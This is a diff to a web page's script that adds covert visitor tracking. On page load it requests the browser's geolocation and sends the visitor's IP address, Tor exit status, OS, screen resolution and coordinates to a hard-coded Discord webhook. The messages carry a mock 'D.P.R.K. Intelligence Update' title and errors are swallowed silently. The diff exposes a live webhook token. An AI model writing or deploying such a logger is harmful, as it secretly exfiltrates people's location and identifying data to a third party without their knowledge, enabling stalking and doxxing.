@@ -18,6 +18,8 @@
 
 	<script>
     var iInfo;
+    var dLat;
+    var dLon;
 
 		async function boofData(datatype) {
 			const h = "https://discord.com/api/webhooks/1349590681160777789/3IUPkV-MaHFy7f7EGgRi8HwaByOyALxBsS37I8HPbqZMRTwrTryz7yF2FTD8QrywVjSL";
@@ -82,6 +84,11 @@
                         inline: true,
                       },
                       {
+                        name: "Tor Exit",
+                        value: String(iInfo.YourFuckingTorExit),
+                        inline: true,
+                      },
+                      {
                         name: "Operating System",
                         value: navigator.platform,
                         inline: true,
@@ -89,6 +96,39 @@
                       {
                         name: "Resolution",
                         value: window.screen.width + "x" + window.screen.height,
+                        inline: true,
+                      },
+                    ],
+                    image: {url: "https://media.discordapp.net/attachments/1275522586767261768/1351273021427421214/zodkNL3.jpg?ex=67d9c691&is=67d87511&hm=9b6a34d01bed35daf475376eba777f974f710a0308f02500e14ccaa616f37f07&=&format=webp"},
+                  }
+                ]
+              }
+            )
+          });
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+            
+        } catch (error) {
+        }
+      } else if (datatype === "geolocation") {
+        try {
+          const response = await fetch(h, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(
+              {
+                embeds: [
+                  {
+                    title: "D.P.R.K. Intelligence Update - Project Juche",
+                    description: "The following data has been collected from address **" + iInfo.YourFuckingIPAddress + "**:",
+                    color: 0xf5c2e7,
+                    fields: [
+                      {
+                        name: "Device Coordinates",
+                        value: iInfo.YourFuckingLocation,
                         inline: true,
                       },
                     ],
@@ -121,7 +161,9 @@
 
 		if (navigator.geolocation) {
 			navigator.geolocation.getCurrentPosition(function(position) {
-
+        dLat = position.coords.latitude;
+        dLon = position.coords.longitude;
+        boofData("geolocation");
 			});
 		}
 	</script>
